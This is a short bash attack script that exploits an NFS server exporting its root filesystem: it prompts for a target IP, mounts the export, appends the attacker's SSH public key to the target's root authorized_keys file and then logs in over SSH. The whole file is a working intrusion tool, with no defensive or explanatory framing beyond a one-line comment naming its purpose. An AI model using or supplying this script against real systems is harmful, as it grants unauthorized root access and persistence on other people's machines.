#!/bin/bash
# nfsSSH.sh will add an SSH key to misconfigured NFS
# Install necessary dependencies for attacking box
#       apt-get install rpcbind nfs-common

# Wait for user to input [remote IP address]
read -p "RHOST: " rhost
showmount -e $rhost > list.tmp
checkmount=`awk 'FNR==2{print $0}' list.tmp`

# if condition will check if NFS has mounted /
if [ "$checkmount" == "/ *" ]; then
    rm list.tmp
    if [ ! -d /tmp/key ]; then
        mkdir /tmp/key
    fi
    mount -t nfs $rhost:/ /tmp/key/
    cat ~/.ssh/id_rsa.pub >> /tmp/key/root/.ssh/authorized_keys
    umount /tmp/key
    ssh $rhost
fi
